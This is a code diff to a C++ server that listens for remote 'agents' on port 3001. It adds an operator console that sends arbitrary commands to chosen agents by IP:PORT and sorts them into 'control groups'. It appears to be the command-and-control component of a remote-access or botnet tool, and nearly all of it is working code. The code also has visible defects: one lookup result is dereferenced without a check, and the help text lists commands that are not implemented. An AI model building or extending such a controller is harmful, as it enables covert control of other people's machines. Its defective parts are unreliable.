@@ -1,5 +1,12 @@
 #include "Server1.hpp"
 
+Server1::~Server1() {
+    std::cout << "destructor!\n";
+    for (AgentConnection* conn : arrAgentConnections) {
+        delete conn;
+    }
+}
+
 
 INT Server1::StartServer() {
     WSADATA wsaData;
@@ -16,7 +23,7 @@ INT Server1::StartServer() {
 
     // Start listener threads
     bIsRunning = TRUE;
-    groupManager.CreateGroup("default1");
+    //groupManager.CreateGroup("default1");
 
     arrThreads[1] = std::thread([this, arrListeningSockets] {
         this->ListenForTcpPort(3001, arrListeningSockets[1]);
@@ -25,46 +32,7 @@ INT Server1::StartServer() {
     std::cout << "[+] Listening for clients on port 3000\n";
     std::cout << "[+] Listening for agents on port 3001\n";
 
-    while (bIsRunning) {
-        BOOL bIsSocketFound = FALSE;
-        std::string szIpPortToCommand;
-        std::string szCommand;
-
-        std::cout << "[*] Enter socket to control on [IP:PORT] -> ";
-        std::getline(std::cin, szIpPortToCommand);
-        std::unique_lock<std::mutex> lock(mAgentConnectionsMutex);
-
-        for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end();) {
-            AgentConnection* conn = *connectionsIterator;
-            if (conn->GetSocketStr() == szIpPortToCommand) {
-
-                std::cout << "[*] Enter command (exit to close the connection) -> ";
-                std::getline(std::cin, szCommand);
-                bIsSocketFound = TRUE;
-
-                if (szCommand != "exit") {
-                    conn->SendCommand(szCommand);
-                }
-                else {
-                    connectionsIterator = RemoveAgentConnection(connectionsIterator);
-                }
-
-                break;
-            }
-            ++connectionsIterator;
-        }
-        
-        lock.unlock();
-
-        if (!bIsSocketFound) {
-            if (szIpPortToCommand == "quit") {
-                bIsRunning = FALSE;
-            }
-            else {
-                std::cout << "[!] Socket does not exist!\n";
-            }
-        }
-    }
+    HandleUserInput();
 
     arrThreads[1].join();
 
@@ -137,7 +105,6 @@ BOOL Server1::ListenForTcpPort(INT nPort, SOCKET listeningSocket)
 
                 if (szData.empty()) {
                     std::cout << "[-] Disconnected from " << conn->GetSocketStr() << "\n";
-                    RemoveSocketFromSet(conn->GetSocket());
                     connectionsIterator = RemoveAgentConnection(connectionsIterator);
                 }
                 else {
@@ -168,14 +135,13 @@ VOID Server1::AddAgentConnection(SOCKET socket) {
     AddSocketToMaster(socket);
     std::cout << "[+] Connected to " << agentCon->GetSocketStr() << "\n";
     PrintActiveAgentSockets();
-    groupManager.AddConnectionToGroup("default1", agentCon);
-    groupManager.AddConnectionToGroup("default2", agentCon);
+    //groupManager.AddConnectionToGroup("default1", agentCon);
+    //groupManager.AddConnectionToGroup("default2", agentCon);
 }
 
 std::vector<AgentConnection*>::iterator Server1::RemoveAgentConnection(std::vector<AgentConnection*>::iterator& connectionIterator) {
+    RemoveConnectionFromAllGroups(*connectionIterator);
     RemoveSocketFromSet((*connectionIterator)->GetSocket());
-    groupManager.RemoveConnectionFromGroup("default1", *connectionIterator);
-    groupManager.RemoveConnectionFromGroup("default2", *connectionIterator);
     delete *connectionIterator;
     auto iterator = arrAgentConnections.erase(connectionIterator);
     PrintActiveAgentSockets();
@@ -196,11 +162,160 @@ VOID Server1::PrintActiveAgentSockets() {
 }
 
 
-Server1::~Server1() {
-    std::cout << "destructor!\n";
-    for (AgentConnection* conn : arrAgentConnections) {
-        delete conn;
+std::vector<AgentConnection*>::iterator Server1::FindConnectionFromSocketStr(std::string szSocket) {
+    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);
+
+    for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end();) {
+        AgentConnection* conn = *connectionsIterator;
+
+        if (conn->GetSocketStr() == szSocket) {
+            return connectionsIterator;
+        }
+
+        ++connectionsIterator;
     }
+
+    std::cout << "Could not find connection " << szSocket << "\n";
+    return arrAgentConnections.end();
+}
+
+VOID Server1::RemoveConnectionFromAllGroups(AgentConnection* conn)
+{
+    auto arrGroups = conn->GetGroups();
+    for (auto group : arrGroups) {
+        groupManager.RemoveConnectionFromGroup(group, conn);
+    }
+}
+
+
+VOID Server1::HandleUserInput() {
+    while (bIsRunning) {
+        std::string input;
+        std::cout << "Enter Full command: ";
+        std::getline(std::cin, input);
+
+        std::istringstream iss(input);
+        std::string command;
+        iss >> command;
+
+        std::vector<std::string> parameters;
+        std::string param;
+
+        while (iss >> param) {
+            parameters.push_back(param);
+        }
+
+        // Output results
+        std::cout << "Command: " << command << "\n";
+        std::cout << "Parameters:\n";
+        for (const auto& p : parameters) {
+            std::cout << "- " << p << "\n";
+        }
+
+        if (command == "quit") {
+            bIsRunning = FALSE;
+        }
+        else if (command == "close") {
+            if (parameters.size() != 1) {
+                std::cout << "Invalid parametrs for close command\n";
+            }
+            else {
+                UserCloseConnection(parameters[0]);
+            }
+        }
+        else if (command == "cmd") {
+            UserRunCommand(parameters);
+        }
+        else if (command == "group-create") {
+            if (parameters.size() == 1) {
+                groupManager.CreateGroup(parameters[0]);
+            }
+            else {
+                std::cout << "Invalid parametrs for group-create command\n";
+            }
+        }
+        else if (command == "group-add") {
+            if (parameters.size() == 2) {
+                AgentConnection* conn = *FindConnectionFromSocketStr(parameters[1]);
+                groupManager.AddConnectionToGroup(parameters[0], conn);
+            }
+            else {
+                std::cout << "Invalid parametrs for group-add command\n";
+            }
+        }
+        else if (command == "group-list") {
+            if (parameters.size() == 1) {
+                groupManager.ListGroupMembers(parameters[0]);
+            }
+            else {
+                std::cout << "Invalid parametrs for group-list command\n";
+            }
+        }
+        else if (command == "man") {
+            UserShowMan();
+        }
+        else {
+            std::cout << "[!] Unrecogzied command\n";
+            UserShowMan();
+        }
+    }
+
+}
+
+
+VOID Server1::UserCloseConnection(std::string szSocket) {
+    auto connectionsIterator = FindConnectionFromSocketStr(szSocket);
+    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);
+
+    if (connectionsIterator != arrAgentConnections.end()) {
+        RemoveAgentConnection(connectionsIterator);
+    }
+}
+
+
+VOID Server1::UserRunCommand(const std::vector<std::string>& arrParameters) {
+    std::string szCommand;
+    std::string szSocket;
+
+    if (arrParameters.size() < 2) {
+        std::cout << "Not enough parameters provided.\n";
+        return;
+    }
+
+
+    for (size_t i = 0; i < arrParameters.size() - 1; ++i) {
+        szCommand += arrParameters[i];
+        if (i < arrParameters.size() - 2)
+            szCommand += " ";
+    }
+
+    szSocket = arrParameters.back();
+
+    std::cout << "Combined parameters: " << szCommand << "\n";
+    std::cout << "Last parameter: " << szSocket << "\n";
+
+    auto connectionsIterator = FindConnectionFromSocketStr(szSocket);
+    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);
+
+    if (connectionsIterator != arrAgentConnections.end()) {
+        (*connectionsIterator)->SendCommand(szCommand);
+    }
+
+}
+
+
+VOID Server1::UserShowMan() {
+    std::cout << "[*] quit - Kill server and all connections\n";
+    std::cout << "[*] close IP:PORT - Close connection with IP:PORT\n";
+    std::cout << "[*] cmd COMMAND IP:PORT - Execute COMMAND on IP:PORT\n";
+    std::cout << "[*] list - Show all active connections\n";
+    std::cout << "[*] group-create - Create a new control group\n";
+    std::cout << "[*] group-delete GROUPNAME - Delete GROUPNAME control group\n";
+    std::cout << "[*] group-add GROUPNAME IP:PORT - Add IP:PORT to GROUPNAME control group\n";
+    std::cout << "[*] group-remove GROUPNAME IP:PORT - Remove IP:PORT from GROUPNAME control group\n";
+    std::cout << "[*] group-list GROUPNAME - Print the members of GROUPNAME control group\n";
+    std::cout << "[*] groups - Print all active control groups\n";
+    std::cout << "[*] man - Show this man page\n";
 }
 
 
